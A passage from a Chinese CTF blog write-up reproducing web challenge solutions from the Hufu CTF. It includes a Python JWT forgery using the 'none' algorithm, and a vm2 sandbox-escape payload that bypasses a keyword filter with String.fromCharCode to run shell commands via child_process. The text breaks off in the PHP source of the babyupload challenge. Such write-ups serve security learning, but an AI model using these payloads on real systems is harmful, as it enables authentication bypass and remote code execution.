@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="noodp" name="robots"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<title>虎符 CTF WEB 部分复现 - X5tar's Blog</title><meta content="" name="Description"/><meta content="虎符 CTF WEB 部分复现" property="og:title"/>
+<meta content="0x00 前言 当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了 趁题还热乎，借着 dalao 们的 WP 复现一波 0x01 easy_login 由于静" property="og:description"/>
+<meta content="article" property="og:type"/>
+<meta content="https://x5tar.com/posts/hfctf-web/" property="og:url"/><meta content="posts" property="article:section"/>
+<meta content="2020-04-22T15:17:37+08:00" property="article:published_time"/>
+<meta content="2020-04-22T15:17:37+08:00" property="article:modified_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="虎符 CTF WEB 部分复现" name="twitter:title"/>
+<meta content="0x00 前言 当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了 趁题还热乎，借着 dalao 们的 WP 复现一波 0x01 easy_login 由于静" name="twitter:description"/>
+<meta content="X5tar's Blog" name="application-name"/>
+<meta content="X5tar's Blog" name="apple-mobile-web-app-title"/><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/><link href="/site.webmanifest" rel="manifest"/><link href="https://x5tar.com/posts/hfctf-web/" rel="canonical"/><link href="https://x5tar.com/posts/bypass-char-number-limit/" rel="prev"/><link href="https://x5tar.com/posts/php-webshell-without-alpha-and-num/" rel="next"/><link href="/lib/normalize/normalize.min.css" rel="stylesheet"/><link href="/css/style.min.css" rel="stylesheet"/><link href="/lib/fontawesome-free/all.min.css" rel="stylesheet"/><link href="/lib/animate/animate.min.css" rel="stylesheet"/><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "虎符 CTF WEB 部分复现",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/x5tar.com\/posts\/hfctf-web\/"
+        },"genre": "posts","keywords": "WriteUp","wordcount":  1600 ,
+        "url": "https:\/\/x5tar.com\/posts\/hfctf-web\/","datePublished": "2020-04-22T15:17:37+08:00","dateModified": "2020-04-22T15:17:37+08:00","publisher": {
+            "@type": "Organization",
+            "name": "X5tar"},"author": {
+                "@type": "Person",
+                "name": "X5tar"
+            },"description": ""
+    }
+    </script></head>
+<body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+<div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu">
+<div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+<input id="search-input-desktop" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-desktop" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-desktop" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-desktop">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class="mobile" id="header-mobile">
+<div class="header-container">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu-toggle" id="menu-toggle-mobile">
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class="menu" id="menu-mobile"><div class="search-wrapper">
+<div class="search mobile" id="search-mobile">
+<input id="search-input-mobile" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-mobile" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-mobile" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-mobile">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a class="search-cancel" href="javascript:void(0);" id="search-cancel-mobile">
+                        取消
+                    </a>
+</div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+<div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+<div class="container"><div class="toc" id="toc-auto">
+<h2 class="toc-title">目录</h2>
+<div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">虎符 CTF WEB 部分复现</h1><div class="post-meta">
+<div class="post-meta-line"><span class="post-author"><a class="author" href="/" rel="author" title="Author"><i class="fas fa-user-circle fa-fw"></i>X5tar</a></span> <span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+<div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i> <time datetime="2020-04-22">2020-04-22</time> <i class="fas fa-pencil-alt fa-fw"></i> 约 1600 字 
+                <i class="far fa-clock fa-fw"></i> 预计阅读 4 分钟 </div>
+</div><div class="details toc" id="toc-static" kept="">
+<div class="details-summary toc-title">
+<span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-前言">0x00 前言</a></li>
+<li><a href="#0x01-easy_login">0x01 easy_login</a></li>
+<li><a href="#0x02-just_escape">0x02 just_escape</a></li>
+<li><a href="#0x03-babyupload">0x03 babyupload</a></li>
+<li><a href="#0x04-完结撒花">0x04 完结撒花</a></li>
+</ul>
+</nav></div>
+</div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
+<p>当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了</p>
+<p>趁题还热乎，借着 dalao 们的 WP 复现一波</p>
+<h2 id="0x01-easy_login">0x01 easy_login</h2>
+<p>由于静态文件的配置问题，有一大波源码泄露（比赛时只看到了这个</p>
+<p>只有 admin 可以看到 flag，而我们不能注册名为 admin 的用户，只能想办法伪造</p>
+<p>题目都说了错的是依赖库，比赛的时候居然没注意到，这里的关键在于用了 jsonwebtoken 库，重点在登录的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="s1">'POST /api/login'</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="kr">const</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">}</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">'login error'</span><span class="p">,</span> <span class="s1">'username or password is necessary'</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">authorization</span> <span class="o">||</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">authorization</span><span class="p">;</span>
+
+        <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">'base64'</span><span class="p">).</span><span class="nx">toString</span><span class="p">()).</span><span class="nx">secretid</span><span class="p">;</span>
+        
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">sid</span><span class="p">)</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nx">sid</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">sid</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">sid</span> <span class="o">&lt;</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">sid</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">APIError</span><span class="p">(</span><span class="s1">'login error'</span><span class="p">,</span> <span class="s1">'no such secret id'</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="kr">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">global</span><span class="p">.</span><span class="nx">secrets</span><span class="p">[</span><span class="nx">sid</span><span class="p">];</span>
+
+        <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="p">{</span><span class="nx">algorithm</span><span class="o">:</span> <span class="s1">'HS256'</span><span class="p">});</span>
+
+        <span class="kr">const</span> <span class="nx">status</span> <span class="o">=</span> <span class="nx">username</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span> <span class="o">===</span> <span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">ctx</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nx">ctx</span><span class="p">.</span><span class="nx">rest</span><span class="p">({</span>
+            <span class="nx">status</span>
+        <span class="p">});</span>
+
+        <span class="kr">await</span> <span class="nx">next</span><span class="p">();</span>
+    <span class="p">},</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>重点在 jwt 库存在缺陷</p>
+<blockquote>
+<p>当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过</p>
+</blockquote>
+<p>我们只要使这里的 secret 为 undifined 或 null 即可，但 sid 不能为 undefined 或 null</p>
+<p>测试发现，当数组索引为浮点数时，得到的结果为 undefined</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;数组索引为浮点数时返回 undefined&lt;/h2&gt;&lt;p&gt;list&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/list.jpg" href="/posts/hfctf-web/list.jpg" title="list">
+<img alt="/posts/hfctf-web/list.jpg" class="lazyload" data-sizes="auto" data-src="list.jpg" data-srcset="/posts/hfctf-web/list.jpg, list.jpg 1.5x, /posts/hfctf-web/list.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">数组索引为浮点数时返回 undefined</figcaption>
+</figure></p>
+<p>可以用 python 构造 token</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">jwt</span>
+<span class="k">print</span><span class="p">(</span><span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s2">"secretid"</span><span class="p">:</span><span class="mf">0.1</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="s2">"123"</span><span class="p">},</span><span class="n">algorithm</span><span class="o">=</span><span class="s2">"none"</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>发送构造的 token 即可以 admin 身份登录，获得 flag</p>
+<h2 id="0x02-just_escape">0x02 just_escape</h2>
+<p>看起来后缀是 php 实际上后端是 nodejs</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">code=Error().stack;
+
+Error
+    at vm.js:1:1
+    at Script.runInContext (vm.js:131:20)
+    at VM.run (/app/node_modules/vm2/lib/main.js:219:62)
+    at /app/server.js:51:33
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at next (/app/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+    at /app/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到是用了 vm，GitHub 上有一个逃逸的 <a href="https://github.com/patriksimek/vm2/issues/225" rel="noopener noreffer" target="_blank">payload</a></p>
+<p>但是这里过滤了一些关键字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">for while process exec eval constructor prototype Function + " '
+</code></pre></td></tr></table>
+</div>
+</div><p>根据 cg 的 payload，引号可以用 String.fromCharCode 绕过</p>
+<p>这里给一个转成这个函数形式的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">s</span> <span class="o">=</span> <span class="s2">"return process"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"String.fromCharCode("</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="o">+</span> <span class="s1">','</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span> <span class="o">+</span> <span class="s1">')'</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里被过滤的方法名可以用 JavaScript 的另一种方法调用形式，即将方法名当作数组索引的形式加上 String.fromCharCode 绕过</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;绕过引号和方法名过滤&lt;/h2&gt;&lt;p&gt;bypass&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/bypass.jpg" href="/posts/hfctf-web/bypass.jpg" title="bypass">
+<img alt="/posts/hfctf-web/bypass.jpg" class="lazyload" data-sizes="auto" data-src="bypass.jpg" data-srcset="/posts/hfctf-web/bypass.jpg, bypass.jpg 1.5x, /posts/hfctf-web/bypass.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">绕过引号和方法名过滤</figcaption>
+</figure></p>
+<p>最终 paylaod 如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="k">try</span><span class="p">{</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},{</span><span class="nx">getOwnPropertyDescriptor</span><span class="p">(){</span><span class="k">throw</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">[</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">)](</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">114</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">))();}}));}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">))[</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">101</span><span class="p">,</span><span class="mi">120</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">99</span><span class="p">)](</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">)).</span><span class="nx">toString</span><span class="p">();}})()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>成功获得 flag</p>
+<h2 id="0x03-babyupload">0x03 babyupload</h2>
+<p>这个是真 PHP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nx">session_save_path</span><span class="p">(</span><span class="s2">"/var/babyctf/"</span><span class="p">);</span>
+<span class="nx">session_start</span><span class="p">();</span>
+<span class="k">require_once</span> <span class="s2">"/flag"</span><span class="p">;</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">===</span><span class="s1">'admin'</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filename</span><span class="o">=</span><span class="s1">'/var/babyctf/success.txt'</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span>
+            <span class="nx">safe_delete</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span><span class="s1">'guest'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$direction</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'direction'</span><span class="p">);</span>
+<span class="nv">$attr</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'attr'</span><span class="p">);</span>
+<span class="nv">$dir_path</span> <span class="o">=</span> <span class="s2">"/var/babyctf/"</span><span class="o">.</span><span class="nv">$attr</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$attr</span><span class="o">===</span><span class="s2">"private"</span><span class="p">){</span>
+    <span class="nv">$dir_path</span> <span class="o">.=</span> <span class="s2">"/"</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">"upload"</span><span class="p">){</span>
+    <span class="k">try</span><span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'up_file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">])){</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'invalid upload'</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'up_file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
+        <span class="nv">$file_path</span> <span class="o">.=</span> <span class="s2">"_"</span><span class="o">.</span><span class="nx">hash_file</span><span class="p">(</span><span class="s2">"sha256"</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'up_file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">'/(\.\.\/|\.\.\\\\)/'</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'invalid file path'</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir_path</span><span class="p">,</span> <span class="mo">0700</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'up_file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span><span class="nv">$file_path</span><span class="p">)){</span>
+            <span class="nv">$upload_result</span> <span class="o">=</span> <span class="s2">"uploaded"</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'error while saving'</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$upload_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">"download"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span><span class="p">{</span>
